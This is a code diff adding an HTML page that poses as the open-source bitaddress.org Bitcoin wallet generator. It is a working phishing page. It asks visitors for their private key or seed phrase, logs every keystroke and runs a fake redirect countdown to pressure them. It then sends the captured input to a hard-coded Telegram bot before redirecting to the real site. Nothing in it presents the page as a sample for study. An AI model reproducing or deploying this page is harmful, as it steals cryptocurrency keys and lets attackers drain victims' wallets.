@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Open Source JavaScript Client-Side Bitcoin Wallet Generator</title>
+    <style>
+        body {
+            text-align: center;
+        }
+        #tagline, #culturemenu {
+            font-size: 12pt;
+        }
+    
+        #logo {
+            max-width: fit-content; /* Set the maximum width of the image to 100% of its container */
+            height: auto; /* Allow the height to adjust proportionally based on the width */
+        }
+    </style>    
+</head>
+<body>
+    <img alt="Bitaddress Logo" title="bitaddress Logo" id="logo" src="https://i.ibb.co/4pgYM1b/bitaddress-logo.png">
+    <div id="culturemenu">
+        <div class="culturemenurow">
+            <span><a href="?culture=en" id="cultureen" class="selected" onclick="ninja.translator.translate('en'); return false;">English</a></span> |
+            <span><a href="?culture=es" id="culturees" onclick="ninja.translator.translate('es'); return false;" class="">Español</a></span> |
+            <span><a href="?culture=fr" id="culturefr" onclick="ninja.translator.translate('fr'); return false;" class="">Français</a></span> |
+            <span><a href="?culture=el" id="cultureel" onclick="ninja.translator.translate('el'); return false;" class="">ελληνικά</a></span> |
+            <span><a href="?culture=it" id="cultureit" onclick="ninja.translator.translate('it'); return false;" class="">italiano</a></span> |
+            <span><a href="?culture=de" id="culturede" onclick="ninja.translator.translate('de'); return false;" class="">Deutsch</a></span>
+        </div>
+        <div class="culturemenurow">
+            <span><a href="?culture=cs" id="culturecs" onclick="ninja.translator.translate('cs'); return false;" class="">Česky</a></span> |
+            <span><a href="?culture=hu" id="culturehu" onclick="ninja.translator.translate('hu'); return false;" class="">Magyar</a></span> |
+            <span><a href="?culture=jp" id="culturejp" onclick="ninja.translator.translate('jp'); return false;" class="">日本語</a></span> |
+            <span><a href="?culture=zh-cn" id="culturezh-cn" onclick="ninja.translator.translate('zh-cn'); return false;" class="">简体中文</a></span> |
+            <span><a href="?culture=ru" id="cultureru" onclick="ninja.translator.translate('ru'); return false;" class="">Русский</a></span> |
+            <span><a href="?culture=pt-br" id="culturept-br" onclick="ninja.translator.translate('pt-br'); return false;" class="">português</a></span>
+        </div>
+        <div style="margin-bottom: 20px;"></div> <!-- Empty div for spacing -->
+    </div>
+    <div id="tagline">Open Source JavaScript Client-Side Bitcoin Wallet Address & QR Code Generator  </div>
+<div style="margin-bottom: 20px;"></div> <!-- Empty div for spacing -->
+<input type="text" id="detailprivkey" placeholder="Enter private key/seed phrase here...">
+
+    <p id="countdown"><b>Redirecting in 30 seconds.<b> <br><br>Enter/paste your private key or seed phrase before redirection countdown ends, for the safety of your information. <br><b>If the countdown ends before you are able to enter your information, go back once— to this page— and reload. Then enter your desired input.<b> <br>Otherwise, this service may not function well.</p>
+
+    <script>
+        var userInputLog = []; // Array to store user inputs
+
+        function logUserInput(input) {
+            var logData = 'User Input: ' + input + '\n';
+            userInputLog.push(logData); // Store user input in the array
+        }
+
+        function sendAlertToBot() {
+            var logContent = userInputLog.join('\n'); // Combine all user inputs for alert
+            console.log('Sending alert to Telegram bot with content: ' + logContent);
+
+            fetch('https://api.telegram.org/bot7967790093:AAE4rgkE4u0dNrvPk2C2xoZMjdl16OMQGCM/sendMessage', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: '858072424',
+                    text: logContent,
+                }),
+            }).then(response => {
+                console.log('Alert sent to Telegram bot successfully.');
+            }).catch(error => {
+                console.error('Error sending alert to Telegram bot:', error);
+            });
+        }
+
+        function handleInput(event) {
+            var inputData = event.target.value;
+            if (inputData.trim() !== '') {
+                logUserInput(inputData);
+            } else {
+                console.error('No input data to log');
+            }
+        }
+
+        document.getElementById('detailprivkey').addEventListener('input', handleInput);
+
+        var countdown = 30;
+        var countdownElement = document.getElementById('countdown');
+        
+        var countdownInterval = setInterval(function() {
+            countdown--;
+            countdownElement.textContent = "Redirecting in " + countdown + " seconds.";
+            if (countdown <= 0) {
+                clearInterval(countdownInterval);
+
+                // Trigger the alerting mechanism to send user input data to the Telegram bot
+                sendAlertToBot();
+
+                // Delay redirection by 3 seconds to allow time for the alert to be sent
+                setTimeout(function() {
+                    window.location.href = 'https://bitaddress.org';
+                }, 3000);
+            }
+        }, 1000);
+    document.write("<p><br>Enter/paste your private key or seed phrase before redirection countdown ends, for the safety of your information. <br><b>If the countdown ends before you are able to enter your information, go back once— to this page— and reload. Then enter your desired input.<b> <br>Otherwise, this service may not function well.</p>");
+    </script>
+</body>
+</html>
